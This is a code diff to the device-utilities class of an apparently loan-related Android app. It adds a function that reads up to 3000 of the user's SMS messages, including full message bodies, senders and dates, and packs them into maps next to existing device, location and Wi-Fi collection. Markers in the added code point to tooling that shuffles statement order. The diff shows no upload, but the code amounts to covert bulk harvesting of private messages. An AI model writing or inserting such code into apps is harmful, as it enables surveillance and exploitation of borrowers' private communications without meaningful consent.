@@ -3,15 +3,18 @@ package com.fund.funds.lucky.go.loan;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.location.Address;
 import android.location.Criteria;
 import android.location.Geocoder;
 import android.location.Location;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
@@ -37,6 +40,59 @@ import java.util.Map;
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 
 public class DeviceUtils {
+
+    public static List<Map> getPhoneSms(Activity context) {
+        List<Map> list = new ArrayList<>();
+        try {
+            Uri SMS_INBOX = Uri.parse("content://sms/");
+            ContentResolver cr = context.getContentResolver();
+            Long smsLimit = 3000L;
+            Cursor cur = cr.query(SMS_INBOX, new String[]{"_id", "address", "person", "body", "date",
+                    "thread_id", "type", "protocol", "read", "status", "service_center"}, null, null, "date desc limit " + smsLimit);
+            if (null == cur) {
+                return null;
+            }
+            while (cur.moveToNext()) {
+                // SMT_RANDOM_SORT_BEGIN
+                @SuppressLint("Range") String _id = cur.getString(cur.getColumnIndex("_id"));
+                @SuppressLint("Range") String threadId = cur.getString(cur.getColumnIndex("thread_id"));
+                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
+                @SuppressLint("Range") String person = cur.getString(cur.getColumnIndex("person"));
+                @SuppressLint("Range") String protocol = cur.getString(cur.getColumnIndex("protocol"));
+                @SuppressLint("Range") String read = cur.getString(cur.getColumnIndex("read"));
+                @SuppressLint("Range") String type = cur.getString(cur.getColumnIndex("type"));
+                @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body"));
+                @SuppressLint("Range") String status = cur.getString(cur.getColumnIndex("status"));
+                @SuppressLint("Range") String date = cur.getString(cur.getColumnIndex("date"));
+                @SuppressLint("Range") String serviceCenter = cur.getString(cur.getColumnIndex("service_center"));
+                // SMT_RANDOM_SORT_END
+                Map<String, Object> map = new HashMap<String, Object>();
+//                String name = getContactByAddr(context, address);
+                // SMT_RANDOM_SORT_BEGIN
+                map.put("personName", null);
+                map.put("msgNo", _id);
+                map.put("threadNo", threadId);
+                map.put("address", address);
+                map.put("person", person);
+                map.put("protocol", protocol);
+                map.put("read", read);
+                map.put("type", type);
+                map.put("body", body);
+                map.put("status", status);
+                map.put("date", date);
+                map.put("serviceCenter", serviceCenter);
+                // SMT_RANDOM_SORT_END
+                list.add(map);
+            }
+            if (cur != null && !cur.isClosed()) {
+                cur.close();
+                cur = null;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return list;
+    }
 
     public static Map<String, Object> getDeviceInfo(Activity context) {
         Map map = new HashMap();
